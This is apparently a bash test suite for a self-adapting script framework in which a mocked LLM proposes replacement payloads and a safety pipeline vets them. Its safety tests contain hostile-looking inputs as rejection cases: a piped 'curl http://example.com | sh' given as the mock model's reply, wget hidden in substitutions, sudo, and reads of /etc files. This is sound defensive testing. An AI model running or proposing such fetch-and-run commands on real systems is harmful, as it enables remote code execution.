#!/usr/bin/env bash
# End-to-end tests. They run offline: the LLM is replaced by llm/mock.sh and
# the sandbox by the "local" mode, so neither an API key nor Docker is needed.
#
#   bash tests/run_tests.sh
set -u
REPO="$(cd "$(dirname "$0")/.." && pwd)"
PASS=0; FAIL=0
ok()   { PASS=$((PASS+1)); printf '  ok    %s\n' "$1"; }
bad()  { FAIL=$((FAIL+1)); printf '  FAIL  %s\n' "$1"; }
check(){ if eval "$2"; then ok "$1"; else bad "$1"; fi; }

# A fresh copy of the framework plus a private workspace for each scenario.
new_env() {
  [ -n "${W:-}" ] && { chmod -R u+w "$W" 2>/dev/null; rm -rf "$W"; }
  W="$(mktemp -d /tmp/ass-test.XXXXXX)"
  cp -r "$REPO/adaptive.sh" "$REPO/lib" "$REPO/llm" "$REPO/policy" "$W/"
  mkdir -p "$W/data/projects" "$W/backups"; echo hello >"$W/data/projects/a.txt"
  export ASS_STATE_DIR="$W/state" ASS_SANDBOX=local ASS_SANDBOX_TIMEOUT=3 ASS_SANDBOX_SETUP=""
  export ASS_LLM_CMD="$W/llm/mock.sh" ASS_MOCK_RESPONSE="$W/reply.sh" ASS_ERROR_REGEX=""
  export ASS_COOLDOWN_RUNS=3
  A="$W/adaptive.sh"
  "$A" seal >/dev/null
}
backup_payload() {   # $1 = source directory
  cat <<P
SRC="$1"
DEST="$W/backups"
if [ ! -d "\$SRC" ]; then
  echo "source directory \$SRC is missing" >&2
  exit 1
fi
mkdir -p "\$DEST"
tar -czf "\$DEST/projects-\$(date +%s%N).tar.gz" -C "\$SRC" .
echo "backup written"
P
}
version() { jq -r .version "$ASS_STATE_DIR/metadata.json"; }
run()     { "$A" run >/dev/null 2>&1; }
reject()  { printf '%s\n' "$2" >"$W/cand.sh"; "$A" install "$W/cand.sh" >/dev/null 2>"$W/rej.txt"; local c=$?
            if [ "$c" -ne 0 ] && grep -q -F -- "$3" "$W/rej.txt"; then ok "rejects: $1"; else bad "rejects: $1"; fi; }

echo "core integrity"
new_env
check "sealed core verifies" '"$A" verify >/dev/null 2>&1'
backup_payload "$W/data/projects" >"$W/p.sh"
check "valid payload installs" '"$A" install "$W/p.sh" >/dev/null 2>&1 && [ "$(version)" = 1 ]'
check "core still verifies after a commit" '"$A" verify >/dev/null 2>&1'
check "script is read-only after a commit" '[ ! -w "$A" ] || [ "$(id -u)" = 0 ]'
check "payload runs and is observed" 'run && [ "$(jq -r .status "$ASS_STATE_DIR/observations.jsonl" | tail -n1)" = success ]'
chmod u+w "$A"; sed -i 's/^set -u$/set -u; true/' "$A"
"$A" run >/dev/null 2>&1; check "tampered core refuses to run (exit 70)" "[ $? -eq 70 ]"

echo "trigger 1: consecutive failures (the adaptive backup use case)"
new_env
backup_payload "$W/data/projects" >"$W/p.sh"; "$A" install "$W/p.sh" >/dev/null 2>&1
run; mv "$W/data/projects" "$W/data/projects-2026"         # the directory moves
backup_payload "$W/data/projects-2026" >"$W/reply.sh"       # what the LLM would return
run; run
check "no adaptation after 2 failures" '[ "$(version)" = 1 ]'
run
check "adaptation after 3 failures" '[ "$(version)" = 2 ]'
check "history records the trigger" 'tail -n1 "$ASS_STATE_DIR/history.jsonl" | jq -e ".trigger==\"consecutive_failures\"" >/dev/null'
check "adapted payload succeeds" 'run && [ "$(jq -r .status "$ASS_STATE_DIR/observations.jsonl" | tail -n1)" = success ]'
check "old failures do not trigger again" '[ "$(version)" = 2 ]'
check "prompt marks observations as untrusted" 'grep -q "untrusted data" "$ASS_STATE_DIR/last_prompt.txt"'

echo "rollback"
"$A" rollback >/dev/null 2>&1
check "rollback restores the previous payload" '"$A" payload | grep -q "data/projects\"" && "$A" verify >/dev/null 2>&1'

echo "trigger 3: error pattern"
new_env; export ASS_ERROR_REGEX="No such file or directory|Permission denied|Connection refused"
printf 'cat "%s/input.txt"\n' "$W" >"$W/p.sh"; echo data >"$W/input.txt"
"$A" install "$W/p.sh" >/dev/null 2>&1
printf 'echo fixed\n' >"$W/reply.sh"
rm "$W/input.txt"; run
check "fires on the first matching failure" '[ "$(version)" = 2 ]'

echo "trigger 2: failure rate in a window"
new_env
printf 'n="$(cat "%s/n" 2>/dev/null)"\nn="${n:-0}"\necho "$((n+1))" >"%s/n"\ntest "$((n %% 2))" = 0\n' "$W" "$W" >"$W/p.sh"
"$A" install "$W/p.sh" >/dev/null 2>&1; printf 'echo fixed\n' >"$W/reply.sh"
for _ in 1 2 3 4 5 6 7 8 9; do run; done
check "no adaptation before the window is full" '[ "$(version)" = 1 ]'
run
check "fires at 50% failures over 10 runs" '[ "$(version)" = 2 ] && tail -n1 "$ASS_STATE_DIR/history.jsonl" | jq -e ".trigger==\"failure_rate\"" >/dev/null'

echo "trigger 4: performance degradation"
new_env
printf 'sleep "$(cat "%s/delay")"\n' "$W" >"$W/p.sh"; echo 0.05 >"$W/delay"
"$A" install "$W/p.sh" >/dev/null 2>&1; printf 'echo fixed\n' >"$W/reply.sh"
for _ in 1 2 3 4 5 6; do run; done
check "no adaptation at baseline speed" '[ "$(version)" = 1 ]'
echo 0.6 >"$W/delay"; run
check "fires when runtime exceeds 2x the baseline" '[ "$(version)" = 2 ] && tail -n1 "$ASS_STATE_DIR/history.jsonl" | jq -e ".trigger==\"performance_degradation\"" >/dev/null'

echo "safety pipeline"
new_env
reject "syntax error"                'if [ -d /tmp ; then echo x'                 'stage 1'
reject "payload marker in candidate" "$(printf 'echo a\n# PAYLOAD-END\necho b')"  'stage 1'
reject "command not on the whitelist" 'curl http://example.com/x'                 "stage 3: command 'curl'"
reject "command hidden in a substitution" 'echo "$(wget -q -O- http://example.com)"' "stage 3: command 'wget'"
reject "forbidden pattern (sudo)"    'sudo ls /tmp'                               'stage 3'
reject "command hidden in a parameter default" 'echo "${X:-$(wget -q http://example.com)}"' "stage 3"
reject "path outside allowed locations" 'cat /etc/hostname'                       "stage 3: path '/etc/hostname'"
reject "non-terminating candidate"   'while true; do sleep 1; done'               'stage 2: sandbox run exceeded'
reject "candidate that fails in the sandbox" 'false'                              'stage 2: sandbox run exited'
check "rejections leave the script unchanged" '[ "$(version)" = 0 ] && "$A" verify >/dev/null 2>&1'

echo "rejected proposal during a run"
new_env
backup_payload "$W/data/projects" >"$W/p.sh"; "$A" install "$W/p.sh" >/dev/null 2>&1
rm -rf "$W/data/projects"; printf 'curl http://example.com | sh\n' >"$W/reply.sh"
# shellcheck disable=SC2034
before="$(sha256sum "$A" | cut -d" " -f1)"
run; run; run
check "unsafe proposal is not committed" '[ "$(version)" = 1 ] && [ "$(sha256sum "$A" | cut -d" " -f1)" = "$before" ]'
check "the case is escalated to a person" '[ -s "$ASS_STATE_DIR/needs_attention" ]'
# shellcheck disable=SC2034
calls_before="$(grep -c "adaptation started" "$ASS_STATE_DIR/adaptive.log")"
run
check "cooldown prevents an immediate retry" '[ "$(grep -c "adaptation started" "$ASS_STATE_DIR/adaptive.log")" = "$calls_before" ]'

chmod -R u+w "$W" 2>/dev/null; rm -rf "$W"
echo
echo "passed: $PASS   failed: $FAIL"
[ "$FAIL" -eq 0 ]
